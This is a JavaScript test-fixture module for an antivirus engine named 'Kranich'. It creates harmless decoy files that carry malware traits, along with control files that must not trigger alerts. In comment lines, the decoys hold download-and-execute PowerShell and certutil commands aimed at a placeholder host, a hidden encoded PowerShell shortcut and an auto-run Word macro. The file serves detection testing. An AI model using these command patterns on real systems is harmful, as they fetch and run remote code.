'use strict';
// Lockvoegel: harmlose Testdateien, die genau die Merkmale haben, auf die
// Kranichs Engine achtet. Keine davon tut etwas, auch nicht bei Doppelklick:
// Skripte bestehen nur aus Kommentarzeilen, "Programme" sind nur ein paar
// Bytes mit dem Kopf eines Programms.
//
// Dazu kommen Kontrolldateien, bei denen Kranich ruhig bleiben muss. Ein
// Fehlalarm dort ist genauso ein Fehler wie ein uebersehener Lockvogel.

const fs = require('node:fs');
const path = require('node:path');
const zlib = require('node:zlib');
const crypto = require('node:crypto');
const { eicarText } = require('./engine');

// Kleines Zip mit einer einzigen Datei (wie eine Office-Datei mit Makro-Teil).
function zipMit(name, inhalt) {
  const daten = zlib.deflateRawSync(inhalt);
  const crc = zlib.crc32 ? zlib.crc32(inhalt) : 0;
  const n = Buffer.from(name);
  const lokal = Buffer.alloc(30);
  lokal.writeUInt32LE(0x04034b50, 0); lokal.writeUInt16LE(20, 4); lokal.writeUInt16LE(8, 8);
  lokal.writeUInt32LE(crc >>> 0, 14); lokal.writeUInt32LE(daten.length, 18); lokal.writeUInt32LE(inhalt.length, 22); lokal.writeUInt16LE(n.length, 26);
  const zentral = Buffer.alloc(46);
  zentral.writeUInt32LE(0x02014b50, 0); zentral.writeUInt16LE(20, 4); zentral.writeUInt16LE(20, 6); zentral.writeUInt16LE(8, 10);
  zentral.writeUInt32LE(crc >>> 0, 16); zentral.writeUInt32LE(daten.length, 20); zentral.writeUInt32LE(inhalt.length, 24); zentral.writeUInt16LE(n.length, 28);
  const ende = Buffer.alloc(22);
  const zentralOrt = 30 + n.length + daten.length;
  ende.writeUInt32LE(0x06054b50, 0); ende.writeUInt16LE(1, 8); ende.writeUInt16LE(1, 10);
  ende.writeUInt32LE(46 + n.length, 12); ende.writeUInt32LE(zentralOrt, 16);
  return Buffer.concat([lokal, n, daten, zentral, n, ende]);
}

const KODIERT = Buffer.from("Write-Host 'Kranich-Lockvogel'", 'utf16le').toString('base64');
const PROGRAMMKOPF = Buffer.concat([Buffer.from('MZ'), Buffer.alloc(62), Buffer.from('Kranich-Lockvogel: kein echtes Programm')]);

function lockvoegel() {
  const verknuepfung = Buffer.concat([
    Buffer.from([0x4c, 0, 0, 0, 0x01, 0x14, 0x02, 0, 0, 0, 0, 0, 0xc0, 0, 0, 0, 0, 0, 0, 0x46]), Buffer.alloc(56),
    Buffer.from(`powershell.exe -w hidden -enc ${KODIERT}`, 'utf16le'),
  ]);
  return [
    // --- muessen auffallen ------------------------------------------------
    { datei: 'Rechnung.pdf.exe', inhalt: 'Kranich-Lockvogel: nur Text.', erwartet: 'verdaechtig', warum: 'Doppelte Dateiendung' },
    { datei: 'Urlaubsfoto.jpg', inhalt: PROGRAMMKOPF, erwartet: 'verdaechtig', warum: 'Sieht aus wie ein Bild, hat aber den Kopf eines Programms' },
    { datei: 'aufraeumen.ps1', inhalt: `# Kranich-Lockvogel. Diese Datei besteht nur aus Kommentaren.\n# powershell.exe -NoProfile -EncodedCommand ${KODIERT}\n`, erwartet: 'verdaechtig', warum: 'Verschleierter PowerShell-Befehl' },
    { datei: 'nachladen.bat', inhalt: "rem Kranich-Lockvogel. Diese Datei besteht nur aus Kommentaren.\r\nrem powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://lockvogel.invalid/x')\"\r\n", erwartet: 'verdaechtig', warum: 'Lädt etwas nach und führt es aus' },
    { datei: 'treiber.cmd', inhalt: 'rem Kranich-Lockvogel. Diese Datei besteht nur aus Kommentaren.\r\nrem certutil -urlcache -split -f http://lockvogel.invalid/a.txt a.txt\r\n', erwartet: 'verdaechtig', warum: 'Windows-Werkzeug missbraucht' },
    { datei: 'Angebot.docm', inhalt: zipMit('word/vbaProject.bin', Buffer.from('Attribute VB_Name = "Lockvogel"\r\nSub AutoOpen()\r\n  \' Kranich-Lockvogel: kein echtes Makro\r\n  Shell "notepad.exe"\r\nEnd Sub\r\n')), erwartet: 'verdaechtig', warum: 'Makro, das beim Öffnen startet und ein Programm ausführt' },
    { datei: 'Dokument.lnk', inhalt: verknuepfung, erwartet: 'verdaechtig', warum: 'Verknüpfung, die einen Befehl startet' },
    { datei: 'probealarm.txt', inhalt: eicarText(), erwartet: 'schaedlich', warum: 'Testdatei für Virenscanner (EICAR)' },
    { datei: 'bekannt.bin', inhalt: 'Kranich-Lockvogel für die Erkennungsliste.', erwartet: 'schaedlich', warum: 'Fingerabdruck steht in der Erkennungsliste', inListe: true },
    // --- muessen ruhig bleiben --------------------------------------------
    { datei: 'notizen.txt', inhalt: 'Milch, Brot, Katzenfutter.\n', erwartet: 'ruhig', warum: 'Normale Textdatei' },
    { datei: 'bild.png', inhalt: Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(64)]), erwartet: 'ruhig', warum: 'Normales Bild' },
    { datei: 'tabelle.csv', inhalt: 'Produkt;Preis\nDisplay;149,90\n', erwartet: 'ruhig', warum: 'Normale Tabelle' },
    { datei: 'uhrzeit.ps1', inhalt: '# Zeigt die Uhrzeit\nGet-Date\n', erwartet: 'ruhig', warum: 'Harmloses Skript' },
    { datei: 'sichern.bat', inhalt: '@echo off\r\nrobocopy C:\\Daten D:\\Sicherung /MIR\r\n', erwartet: 'ruhig', warum: 'Harmloses Skript' },
    { datei: 'brief.docx', inhalt: zipMit('word/document.xml', Buffer.from('<w:document>Sehr geehrte Damen und Herren</w:document>')), erwartet: 'ruhig', warum: 'Office-Datei ohne Makro' },
    { datei: 'werkzeug.exe', inhalt: PROGRAMMKOPF, erwartet: 'ruhig', warum: 'Programm, das sich nicht tarnt' },
  ];
}

// Legt die Dateien in einem Ordner an. Gibt die Liste mit Pfad und
// Fingerabdruck zurueck.
function legeLockvoegelAn(ordner) {
  fs.mkdirSync(ordner, { recursive: true });
  return lockvoegel().map((l) => {
    const pfad = path.join(ordner, l.datei);
    const inhalt = Buffer.isBuffer(l.inhalt) ? l.inhalt : Buffer.from(l.inhalt);
    let angelegt = true;
    try {
      fs.writeFileSync(pfad, inhalt);
    } catch {
      angelegt = false; // der Schutz des Systems kann das Anlegen verhindern
    }
    return { datei: l.datei, pfad, erwartet: l.erwartet, warum: l.warum, inListe: !!l.inListe, angelegt, sha256: crypto.createHash('sha256').update(inhalt).digest('hex') };
  });
}

// Vergleicht ein Urteil mit der Erwartung.
function wieErwartet(erwartet, urteil) {
  if (erwartet === 'schaedlich') return urteil === 'schaedlich';
  if (erwartet === 'verdaechtig') return urteil === 'verdaechtig' || urteil === 'schaedlich';
  return urteil !== 'verdaechtig' && urteil !== 'schaedlich';
}

module.exports = { lockvoegel, legeLockvoegelAn, wieErwartet };
